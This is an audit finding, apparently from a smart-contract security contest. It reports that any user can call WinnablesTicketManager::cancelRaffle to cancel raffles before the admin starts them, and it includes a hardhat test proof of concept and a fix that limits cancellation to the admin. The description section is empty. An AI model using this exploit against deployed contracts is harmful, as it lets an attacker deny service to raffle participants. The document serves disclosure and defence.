---
id: 25748
severity: "Crit/High"
---

# Attacker will prevent any raffles by calling WinnablesTicketManager::cancelRaffle before admin starts raffle

## Description



## Proof of Concept

The test below, which can be added to the hardhat test suite, shows that a random user can cancel the raffle if it hasn't yet been started

```javascript
  describe('Buyer can cancel raffle', () => {
    before(async () => {
      snapshot = await helpers.takeSnapshot();
    });

    after(async () => {
      await snapshot.restore();
    });
    const buyers = [];

    it('Should be able to cancel a raffle', async () => {
      const now = await blockTime();
      const buyer = await getWalletWithEthers();
      await (await link.mint(manager.address, ethers.utils.parseEther('100'))).wait();
      const tx = await manager.connect(buyer).cancelRaffle(counterpartContractAddress, 1, 1);
      const { events } = await tx.wait();
      expect(events).to.have.lengthOf(3);
      const ccipMessageEvent = ccipRouter.interface.parseLog(events[0]);
      expect(ccipMessageEvent.name).to.eq('MockCCIPMessageEvent');
      expect(ccipMessageEvent.args.data).to.eq('0x000000000000000000000000000000000000000000000000000000000000000001');
      await expect(manager.getWinner(1)).to.be.revertedWithCustomError(manager, 'RaffleNotFulfilled');
    });
  });
```

## Recommendation

This vulnerability can be mitigated by updating the underlying function `WinnablesTicketManager::_checkShouldCancel` to only allow the admin to cancel a raffle that hasn't started yet.
